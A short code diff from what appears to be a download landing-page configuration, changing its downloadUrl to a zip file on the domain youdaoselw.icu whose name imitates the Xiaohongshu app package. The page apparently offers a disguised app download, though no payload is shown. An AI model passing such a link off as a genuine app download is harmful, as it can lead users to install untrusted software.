@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://youdaoselw.icu/Winde_XHSwindows9d6as48.zip", 
+    downloadUrl: "https://youdaoselw.icu/Feuie_com.xingin.xhs_2300r.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
